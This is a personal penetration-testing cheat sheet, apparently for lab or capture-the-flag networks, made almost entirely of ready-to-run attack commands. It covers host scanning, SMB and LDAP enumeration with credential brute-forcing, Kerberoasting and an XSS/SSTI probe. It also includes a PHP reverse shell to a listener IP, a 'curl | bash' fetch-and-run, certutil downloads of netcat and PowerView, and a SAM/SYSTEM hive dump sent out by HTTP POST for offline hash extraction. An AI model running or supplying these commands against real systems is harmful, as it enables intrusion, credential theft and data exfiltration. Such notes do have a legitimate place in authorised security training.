
My Methodology


<details>
    <summary>Host Discovery (External)</summary>
    ━━━━━━━━━━━━━━━━━━━━━━━━━   
    ```
    fping -ag 10.10.110.0/24 2>/dev/null | tee external-ips ; \
for ip in $(cat external-ips); do nmap=$(nmap -p- --max-retries 1 --min-rate 10000 --open "$ip" | grep -vE 'Warning:|filtered|latency|Starting'); echo "$nmap"; ports=$(echo "$nmap" | sed -n 's|/.*||p' | paste -sd ','); echo "nmap -sC -sV -Pn -p$ports $ip"; echo; done
    ```
</details>

Host Discovery (Internal)
━━━━━━━━━━━━━━━━━━━━━━━━━
fping -ag 172.16.1.0/24 2>/dev/null | tee internal-ips ; \
for ip in $(cat internal-ips); do nmap=$(nmap -p- --max-retries 1 --min-rate 10000 --open "$ip" | grep -vE 'Warning:|filtered|latency|Starting'); echo "$nmap"; ports=$(echo "$nmap" | sed -n 's|/.*||p' | paste -sd ','); echo "nmap -sC -sV -Pn -p$ports $ip"; echo; done


Service Enumeration
━━━━━━━━━━━━━━━━━━━━━━━━━
nmap -Pn -sC -sV 172.16.1.10 -p22,80,139,445
ldap=$(nmap --script "ldap* and not brute" -p 389 172.16.1.10); echo "$ldap"
nxc ftp 172.16.1.10 --port 21 -u 'anonymous' -p 'anonymous' --ls
nxc smb 172.16.1.10 --port 445 -u usernames -p passwords --rid-brute 10000
nxc smb 172.16.1.10 --port 445 -u usernames -p passwords --shares
mysql -h 172.16.1.10 -u root@localhost -e 'show databases;'
impacket-GetNPUsers -usersfile usernames domain/ -dc-ip 172.16.1.10
impacket-GetUserSPNs -request-user "$objuser" -dc-ip 172.16.1.10 domain/username:password
impacket-GetUserSPNs -no-preauth "$user" -usersfile usernames -dc-host 172.16.1.10 domain/
impacket-GetUserSPNs -request -dc-ip 172.16.1.10 domain/username:password

for x in $(showmount -e 172.16.1.10 | awk '{print $1}' | grep -v 'Export')
    do mkdir -p "/dev/shm"/mnt"$x"
    sudo mount -t nfs 172.16.1.10:"$x" "/dev/shm"/mnt"$x" -o nolock
    tree -puga "/dev/shm"/mnt"$x"
done


Web Enumeration
━━━━━━━━━━━━━━━━━━━━━━━━━
[*] Technology Discovery
whatweb http://10.10.110.100

[*] WordPress Discovery
wpscan --url http://10.10.110.100/wordpress --enumerate

[*] Directory Discovery
ffuf -u 'http://10.10.110.100/FUZZ' -t 400 -rate 10000 -e .php -v -recursion -mc 200,301 \
-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
2>/dev/null | grep -oP '(http.*)(?<!/)$'

[*] Directory Traversal
ffuf -u 'http://10.10.110.100/nav.php?page=FUZZ' -t 400 -rate 10000 -v -mc 200 \
-w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
2>/dev/null | grep -oP '(http.*)(?<!/)$'

[*] XSS + SSTI
<img src=x>'"${{7*7}}

[*] Subdomain Discovery
gobuster vhost --append-domain -u example.com -k -r -t200 -q \
-w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
| grep -oP '(?<=Found: )[^ ]+'


Exploitation
━━━━━━━━━━━━━━━━━━━━━━━━━
[*] Reverse Shells
<?php
$lhost = "10.10.16.3";
$lport = 4444;

exec("bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'");
$sock = fsockopen($lhost, $lport);
if ($sock) {
    exec("sh <&3 >&3 2>&3");
}
?>

[*] Upgrade TTY
python3 -c 'import pty; pty.spawn("/bin/bash")';
CTRL-Z
stty size;stty raw -echo;fg
export SHELL=bash;
export TERM=xterm-256color;
stty rows <num> columns <num>
reset


Post Exploitation
━━━━━━━━━━━━━━━━━━━━━━━━━
[*] Linux
ssh user@xxxxxxxxx -i id_rsa -L 33060:localhost:33060
netstat -tuln
ls -la /opt
sudo -l
find / -perm /4000 2>/dev/null
grep -r -E 'conf' /var/www
cat ~/.ssh/id_rsa
cat /etc/shadow
curl xxxxxxxxxx:8088/linpeas.sh | bash
GTFO bins

[*] Windows
evil-winrm -i xxxxxxxxxx -u 'username' -p 'password'
evil-winrm -i xxxxxxxxxx -u 'username' -H 'hash'
cd C:\users
tree /f
powershell -c "certutil -urlcache -f http://xxxxxxxxxx:8088/winpeas.exe C:\programdata\winpeas.exe"
powershell -c "certutil -urlcache -f http://xxxxxxxxxx:8088/nc.exe C:\programdata\nc.exe"

click.url
[InternetShortcut]
URL=C:\programdata\shell.bat

meterpreter > use priv
meterpreter > getsystem

nxc winrm xxxxxxxxxx -u 'username' -p 'password' -x \
'
powershell -c rm *.SAV
powershell -c reg save HKLM\SYSTEM SYSTEM.SAV
powershell -c reg save HKLM\SAM SAM.SAV
powershell -c compress-archive *.SAV SAM.zip
powershell -c dir
iwr http://xxxxxxxxxx:xxxx -Method POST -InFile SAM.zip
'; unzip -o SAM.zip; \
impacket-secretsdump LOCAL -sam SAM.SAV -system SYSTEM.SAV

powershell -c "certutil -urlcache -f http://xxxxxxxxxx:8088/powerview.ps1 C:\programdata\powerview.ps1"
powershell Import-Module C:\programdata\powerview.ps1
Get-NetDomain
Get-LocalUser
Set-DomainObject -Identity USERNAME -SET @{serviceprincipalname='SET/SET'}; Get-DomainSPNTicket -spn SET/SET
bloodhound-python -c all -u 'username' -p 'password' -d "$domain" -dc "$dc" -ns "$target"
bloodhound-python -c default -u 'username' -p 'password' -d "$domain" -dc "$dc" -ns "$target"
